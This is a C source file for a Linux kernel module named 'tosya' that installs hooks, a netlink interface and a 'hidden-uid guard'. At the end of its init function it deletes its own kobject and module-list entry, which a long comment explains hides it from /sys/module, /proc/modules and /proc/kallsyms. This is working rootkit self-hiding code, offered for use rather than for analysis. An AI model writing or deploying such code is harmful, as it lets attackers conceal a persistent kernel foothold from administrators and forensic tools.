// SPDX-License-Identifier: GPL-2.0
#include <linux/kernel.h>
#include <linux/module.h>

#include <linux/workqueue.h>

#include "tosya.h"

struct static_key_false tosya_debug_key;

/* Diagnostics switch themselves off, so a run that enabled them leaves nothing
 * behind. */
static void tosya_debug_off(struct work_struct *work);
static DECLARE_DELAYED_WORK(tosya_debug_work, tosya_debug_off);

/* The parameter is a one-shot: it arms the key and the work item disarms it a
 * minute later. */
#ifdef TOSYA_DEBUG_ALWAYS
static bool tosya_debug = true;
#else
static bool tosya_debug;
#endif
module_param_named(debug, tosya_debug, bool, 0644);
MODULE_PARM_DESC(debug,
		 "log the isolated-child naming for 60 seconds after load");

static void tosya_debug_off(struct work_struct *work)
{
	(void)work;
	if (static_key_enabled(&tosya_debug_key)) {
		static_branch_disable(&tosya_debug_key);
		pr_info("tosya: diagnostics off\n");
	}
}

void tosya_debug_init(bool on)
{
	if (!on)
		return;
	static_branch_enable(&tosya_debug_key);
#ifdef TOSYA_DEBUG_ALWAYS
	pr_info("tosya: diagnostics on (compiled in, they never turn off)");
	return;
#else
	pr_info("tosya: diagnostics on for 60 s\n");
	schedule_delayed_work(&tosya_debug_work, 60UL * HZ);
#endif
}

static int __init tosya_init(void)
{
	if (policy_init())
		return -ENOMEM;

	tosya_debug_init(tosya_debug);

	netlink_init();
	/* An inline tier may pin this module and publish a kernel entry below.
	 * Module-loader failure frees even pinned modules: no error return after
	 * this point. Individual unsupported tiers report their own status. */
	pr_info("tosya: ready (%d hook(s))\n", hooks_install());

	/*
	 * Take the module's own name back off the list.
	 *
	 * A loaded module announces itself three times -- a directory under
	 * /sys/module, an entry in /proc/modules, and the symbols it exports in
	 * /proc/kallsyms -- and all three are generated from the two structures
	 * removed here. Nothing in userspace has any business reading the name of
	 * this module, and whatever a hidden-uid guard is for is defeated by a
	 * module that can be found by listing them.
	 *
	 * It cannot fail and needs no undo: the kobject is only unlinked from
	 * sysfs, and the module list only loses its node. Module parameters are
	 * already read (the loader does that before init runs), so nothing that
	 * has been set up here stops working. This has to stay the last thing init
	 * does: until hooks_install has run, an error return is still possible, and
	 * a module that fails after this point would be freed with its name gone.
	 */
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->list);

	return 0;
}

static void __exit tosya_exit(void)
{
	cancel_delayed_work_sync(&tosya_debug_work);
	netlink_exit();
	hooks_remove();
	policy_free();
	pr_info("tosya: unloaded\n");
}

module_init(tosya_init);
module_exit(tosya_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("KodateMitsuru");
MODULE_DESCRIPTION("Тося. She answers as if she were never installed.");
